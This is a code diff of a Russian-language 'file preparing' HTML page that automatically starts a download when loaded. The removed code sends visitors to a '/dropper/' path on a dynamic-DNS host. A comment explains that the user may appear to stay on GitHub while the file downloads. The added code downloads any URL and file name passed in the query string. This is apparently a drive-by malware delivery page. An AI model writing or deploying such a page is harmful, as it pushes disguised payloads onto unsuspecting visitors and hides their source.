@@ -15,29 +15,42 @@
     <div class="card">
         <div class="loader" id="loader"></div>
         <h2 id="status">Подготовка файла...</h2>
+        <p id="subtext">Ваш документ будет загружен автоматически.</p>
         <a href="#" class="btn" id="manualBtn" style="display:none;">Скачать вручную</a>
     </div>
 
     <script>
-            const urlParams = new URLSearchParams(window.location.search);
-            const subpath = urlParams.get('path');
-            const apiBase = "http://echomapwa.ddns.net/dropper/documentdwnl/";
-        
-            if (subpath) {
-                // МЯГКИЙ РЕДИРЕКТ: Браузер перейдет по ссылке, увидит заголовки файла и начнет качать
-                // При этом визуально пользователь может остаться на странице GitHub, если сервер сразу отдаст attachment
-                window.location.href = apiBase + subpath;
-        
-                setTimeout(() => {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('status').innerText = 'Файл готов';
-                    const btn = document.getElementById('manualBtn');
-                    btn.href = apiBase + subpath;
-                    btn.style.display = 'inline-block';
-                }, 3000);
-            } else {
-                window.location.href = "https://google.com"; 
-            }
+        const urlParams = new URLSearchParams(window.location.search);
+        const fileUrl = urlParams.get('file_url');
+        const fileName = urlParams.get('name') || 'document';
+
+        if (fileUrl) {
+            const decodedUrl = decodeURIComponent(fileUrl);
+            
+            // Функция для скачивания
+            const download = () => {
+                const link = document.createElement('a');
+                link.href = decodedUrl;
+                link.download = decodeURIComponent(fileName);
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            };
+
+            // Запускаем скачивание
+            download();
+
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').innerText = 'Файл готов';
+                document.getElementById('subtext').innerText = 'Если скачивание не началось, нажмите кнопку:';
+                const btn = document.getElementById('manualBtn');
+                btn.href = decodedUrl;
+                btn.style.display = 'inline-block';
+            }, 3000);
+        } else {
+            window.location.href = "https://google.com";
+        }
     </script>
 </body>
 </html>
